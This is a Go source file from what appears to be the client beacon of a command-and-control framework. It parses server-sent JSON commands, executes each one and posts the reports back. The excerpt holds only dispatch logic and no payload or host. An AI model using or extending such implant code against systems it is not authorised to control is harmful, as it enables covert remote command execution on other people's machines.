package beaconhandler

import (
	"encoding/json"
	"fmt"
	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/logger"
)

// HandleResponse is the entry point for processing a server's response.
// It is typically called in a new goroutine from the main Beacon loop.
func HandleResponse(responseBody string) bool {
	logger.Log("Handling server response.")

	// 1. Parse the initial server response.
	serverResponse, err := parseServerResponse(responseBody)
	if err != nil {
		logger.Error("Critical error parsing server response: " + err.Error())
		return false
	}

	if len(serverResponse.Commands) == 0 {
		logger.Log("No commands received in response.")
		return false
	}

	reports, switchSession := processCommands(serverResponse.Commands)

	// 3. Post the generated reports back to the server.
	if err := postReportsToServer(reports); err != nil {
		logger.Error("Failed to post reports to server: " + err.Error())
	}
	return switchSession
}

// parseServerResponse unmarshals the raw JSON string from the server.
func parseServerResponse(responseBody string) (httpFuncs.ServerResponseWithCommands, error) {
	var serverData httpFuncs.ServerResponseWithCommands
	if err := json.Unmarshal([]byte(responseBody), &serverData); err != nil {
		return httpFuncs.ServerResponseWithCommands{}, fmt.Errorf("JSON unmarshal failed: %w. Body: %s", err, responseBody)
	}
	logger.Log(fmt.Sprintf("Successfully parsed response with %d command(s).", len(serverData.Commands)))
	return serverData, nil
}

// processCommands iterates through a list of commands, executes them,
// and returns a list of reports.
func processCommands(commands []httpFuncs.CommandData) ([]httpFuncs.CommandReport, bool) {
	var reports []httpFuncs.CommandReport
	var switchSession bool
	for _, command := range commands {
		report, session := executeCommand(command)
		reports = append(reports, report)
		// Handle any special side-effects after execution.
		if session {
			switchSession = true
		}
	}
	return reports, switchSession
}
